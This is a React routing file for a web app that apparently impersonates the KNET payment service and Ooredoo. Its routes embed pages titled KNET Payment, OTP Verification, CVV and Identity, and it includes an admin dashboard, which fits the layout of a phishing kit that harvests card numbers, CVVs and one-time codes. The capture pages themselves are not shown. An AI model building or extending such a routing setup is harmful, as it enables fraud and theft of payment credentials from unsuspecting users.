import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import { ThemeProvider } from "./contexts/ThemeContext";
import Home from "./pages/Home";
import HomeEn from "./pages/HomeEn";
import Pay from "./pages/Pay";
import PayEn from "./pages/PayEn";
import Loading from "./pages/Loading";
// Removed React component imports - using original HTML files instead
import AdminDashboard from "@/pages/AdminDashboard";
import AdminLogin from "@/pages/AdminLogin";

// Wrapper components for HTML pages
const KnetPage = () => {
  return (
    <iframe
      src="/knet/knetpage.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="KNET Payment"
    />
  );
};

const OTPPage = () => {
  return (
    <iframe
      src="/myooredoo/otp.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="OTP Verification"
    />
  );
};

const HawetPage = () => {
  return (
    <iframe
      src="/myooredoo/hawety.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="Identity"
    />
  );
};

const CVVPage = () => {
  return (
    <iframe
      src="/myooredoo/cvv.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="CVV"
    />
  );
};

const ClientPage = () => {
  return (
    <iframe
      src="/client.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="Client"
    />
  );
};


function Router() {
  // make sure to consider if you need authentication for certain routes
  return (
    <Switch>
      <Route path={"/"} component={Home} />
      <Route path={"/en"} component={HomeEn} />
      <Route path={"/pay"} component={Pay} />
      <Route path={"/pay-en"} component={PayEn} />
      <Route path={"/knet"} component={KnetPage} />
      <Route path={"/loading"} component={Loading} />
      <Route path={"/otp"} component={OTPPage} />
      <Route path={"/identity"} component={HawetPage} />
      <Route path={"/cvv"} component={CVVPage} />
      <Route path={"/hawety"} component={HawetPage} />
      <Route path={"/client"} component={ClientPage} />
      <Route path={"/admin-dashboard"} component={AdminDashboard} />
       <Route path="/admin" component={AdminDashboard} />
      <Route path="/admin-login" component={AdminLogin} />
      <Route path={"/404"} component={NotFound} />
      {/* Final fallback route */}
      <Route component={NotFound} />
    </Switch>
  );
}

// NOTE: About Theme
// - First choose a default theme according to your design style (dark or light bg), than change color palette in index.css
//   to keep consistent foreground/background color across components
// - If you want to make theme switchable, pass `switchable` ThemeProvider and use `useTheme` hook

function App() {
  return (
    <ErrorBoundary>
      <ThemeProvider
        defaultTheme="light"
      >
        <TooltipProvider>
          <Toaster />
          <Router />
        </TooltipProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
